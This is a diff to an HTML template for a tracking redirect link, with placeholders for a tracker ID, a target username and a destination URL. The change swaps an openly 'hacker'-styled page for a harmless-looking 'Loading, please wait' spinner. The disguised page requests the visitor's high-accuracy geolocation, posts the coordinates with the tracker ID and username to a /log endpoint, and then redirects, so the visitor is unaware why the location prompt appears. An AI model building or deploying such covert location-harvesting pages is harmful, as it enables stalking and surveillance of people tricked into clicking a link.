@@ -2,37 +2,100 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Initializing connection...</title>
-    <style> body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 50px; } </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            flex-direction: column;
+            text-align: center;
+        }
+        .spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-left-color: #007bff;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        h1 {
+            font-size: 1.5em;
+            margin-bottom: 10px;
+        }
+        p {
+            font-size: 0.9em;
+            color: #666;
+        }
+    </style>
 </head>
 <body>
-    <p>> Establishing secure connection... Please wait.</p>
-    <p>> Bypassing firewall... done.</p>
-    <p>> Fetching geolocation data...</p>
+    <div class="spinner"></div>
+    <h1>Loading, please wait...</h1>
+    <p>You will be redirected automatically.</p>
 
     <script>
-        const destinationUrl = '{{DESTINATION_URL}}';
-        const trackerId = '{{TRACKER_ID}}';
-        const username = '{{USERNAME}}';
+        const trackerId = "{{TRACKER_ID}}";
+        const username = "{{USERNAME}}";
+        const destinationUrl = "{{DESTINATION_URL}}";
 
-        function redirectToDestination() { window.location.href = destinationUrl; }
-        function sendLocationToServer(position) {
-            const { latitude, longitude } = position.coords;
+        const sendLocation = (latitude, longitude) => {
             fetch('/log', {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ latitude, longitude, trackerId, username })
-            }).finally(redirectToDestination);
-        }
-        function handleLocationError(error) { redirectToDestination(); }
-
-        window.onload = () => {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendLocationToServer, handleLocationError, {
-                    enableHighAccuracy: true, timeout: 10000, maximumAge: 0
-                });
-            } else { redirectToDestination(); }
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ latitude, longitude, trackerId, username }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Location sent:', data);
+            })
+            .catch((error) => {
+                console.error('Error sending location:', error);
+            });
         };
+
+        const getLocation = () => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        sendLocation(position.coords.latitude, position.coords.longitude);
+                        // Redirect setelah mendapatkan lokasi (atau timeout singkat)
+                        setTimeout(() => {
+                            window.location.href = destinationUrl;
+                        }, 1500); // Redirect setelah 1.5 detik
+                    },
+                    (error) => {
+                        console.warn('Geolocation error:', error);
+                        // Jika ada error (misal: user menolak), tetap redirect
+                        window.location.href = destinationUrl;
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 5000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                console.warn('Geolocation not supported by this browser.');
+                // Redirect langsung jika Geolocation tidak didukung
+                window.location.href = destinationUrl;
+            }
+        };
+
+        // Mulai proses mendapatkan lokasi dan redirect
+        getLocation();
     </script>
 </body>
 </html>
